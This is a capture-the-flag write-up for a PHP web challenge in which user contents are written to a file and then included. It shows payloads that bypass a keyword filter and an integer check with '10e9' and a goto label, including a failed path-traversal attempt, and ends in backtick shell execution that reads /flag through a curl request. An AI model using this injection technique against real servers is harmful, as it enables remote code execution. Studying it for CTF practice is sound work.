# Do You Hate NaNa? - CTF Challenge Writeup

**Challenge Name:** Do You Hate NaNa?
**Category:** Web Exploitation
**Points:** 50


![](attachments/Pasted%20image%2020251130144906.png)


## Challenge
![](attachments/Pasted%20image%2020251130144919.png)



## Initial Reconnaissance

### Analyzing the Source Code

Visiting the challenge URL without parameters reveals the PHP source code:

```php
<?php
if (!isset($_GET['file']) || !isset($_GET['contents']) || $_SERVER['REQUEST_METHOD'] === 'POST') {
    highlight_file(__FILE__);
    exit;
}
$filename = $_GET['file'];
$contents = $_GET['contents'];

if (strpos($contents, '$') !== false || strpos($contents, '@') !== false || strpos($filename, ':') !== false) {
    exit('Do you hate NaNa ?');
}

$blacklisted_keywords = ['__', 'system', '$', '[', 'com',']'];
foreach ($blacklisted_keywords as $char) {
    $contents = str_replace($char, '', $contents);
}
$contents = '<?php DO_You_Hate_NaNa'. $contents. '<?php I am happy to play with my boy friend\'s IDE';
$prefix=bin2hex(random_bytes(strlen('DO you really hate nana?')));
@file_put_contents($prefix.$filename.'.nana', $contents);

$num = substr($_GET['contents'], 0, 4);
$x = (int) $num;
$y = '9999999999';
if($x > $y && strlen($x) > strlen($y)){
    @include($prefix.$filename.'.nana');
}
@unlink($prefix.$filename.'.nana');
```

### Key Observations

1. **Input Parameters:** Requires `file` and `contents` via GET request
2. **Character Restrictions:**
   - `$` and `@` blocked in `contents`
   - `:` blocked in `filename`
3. **Blacklist Filtering:** Removes `__`, `system`, `$`, `[`, `com`, `]` from contents
4. **Content Wrapping:** User input is wrapped with:
   ```php
   '<?php DO_You_Hate_NaNa' + [contents] + '<?php I am happy to play with my boy friend\'s IDE'
   ```
5. **Integer Check:** First 4 characters must convert to int > 9999999999
6. **File Operations:**
   - Creates file with random prefix + filename + `.nana` extension
   - Includes file if integer check passes
   - Deletes file after (if no errors)


## Vulnerability Analysis

### The Integer Check Bypass

The condition requires:

```php
$x > $y && strlen($x) > strlen($y)
```

Where:

- `$x = (int) substr($_GET['contents'], 0, 4)`
- `$y = '9999999999'` (10 digits)

**Solution:** Use scientific notation!

- `10e9` → converts to `10000000000` (11 digits)
- `(int)"10e9"` = 10,000,000,000 > 9,999,999,999 ✓
- `strlen(10000000000)` = 11 > 10 ✓

### The Main Problem: Content Wrapping

With payload starting with `10e9`, the wrapped content becomes:

```php
<?php DO_You_Hate_NaNa10e9[rest_of_payload]<?php I am happy to play with my boy friend's IDE
```

When PHP executes this, it tries to evaluate `DO_You_Hate_NaNa10e9` as a constant, which causes:

```
Fatal error: Uncaught Error: Undefined constant "DO_You_Hate_NaNa10e9"
```

This was the main challenge - bypassing this undefined constant error in PHP 8.4.15.

## Failed Exploitation Attempts

### Attempt 1: Using Newlines

```
10e9\n;?><?php passthru('cat /flag');//
```

**Result:** Still evaluated `DO_You_Hate_NaNa10e9` on line 1 → Fatal error

![](attachments/Pasted%20image%2020251130151746.png)

### Attempt 2: Using Comments

```
10e9;//\n?><?php passthru('cat /flag');//
```

**Result:** Comment comes after the identifier → Still fatal error


![](attachments/Pasted%20image%2020251130151932.png)

### Attempt 3: Multi-line Comments

```
10e9/*\n*/?><?php passthru('cat /flag');//
```

**Result:** Fixed parse errors but still runtime fatal error

![](attachments/Pasted%20image%2020251130152052.png)

### Attempt 4: Null Byte Injection

```
10e9\x00;?><?php passthru('cat /flag');//
```

**Result:** Parse error on null byte character

![](attachments/Pasted%20image%2020251130152200.png)

### Attempt 5: Path Traversal

```
file=../../../../../tmp/shell&contents=10e9;?><?php passthru('cat /flag');//
```

**Result:** File created at `/tmp/shell.nana` but still fatal error on include


## The Solution: PHP Labels

### The Breakthrough

The key insight was recognizing that PHP supports **goto labels** with the syntax:

```php
label_name:
statement;
```

By adding a colon `:` after `10e9`, the wrapped content becomes:

```php
<?php DO_You_Hate_NaNa10e9:;?><?php echo `cat /flag*`;#<?php I am happy...
```

Now `DO_You_Hate_NaNa10e9:` is a **valid PHP label**, not an undefined constant!

### Final Payload

```
http://38.60.200.116:8082/?file=test&contents=10e9:;%3F%3E%3C%3Fphp%20echo%20%60cat%20/flag*%60;%23
```

Breaking down the payload:

```
10e9:;?><?php echo `cat /flag*`;#
```

- `10e9` - First 4 chars for integer check (scientific notation)
- `:` - Makes it a label instead of constant
- `;` - Terminates the label statement
- `?>` - Closes the first PHP block
- `<?php echo `cat /flag\*`;` - Opens new PHP block and executes shell command with backticks
- `#` - Comments out the trailing `<?php I am happy...` text

### Execution Flow

The wrapped file content:

```php
<?php DO_You_Hate_NaNa10e9:;?><?php echo `cat /flag*`;#<?php I am happy to play with my boy friend's IDE
```

Parsed as:

1. `<?php DO_You_Hate_NaNa10e9:;?>` - Valid PHP block with a label
2. `<?php echo `cat /flag\*`;` - New PHP block executing shell command
3. `#<?php I am happy...` - Comment (everything after `#`)



## Exploitation

### Step-by-step Exploitation

```bash
# URL-encode the payload
curl -s "http://38.60.200.116:8082/?file=test&contents=10e9:;%3F%3E%3C%3Fphp%20echo%20%60cat%20/flag*%60;%23"
```

### Result

```
NOVA_CTF{1_@m_r3A11y_s0rRy_f0R_mY_girlfriend's_actions_f2527fca43b3cf187813fe0c39d78ffa}
```


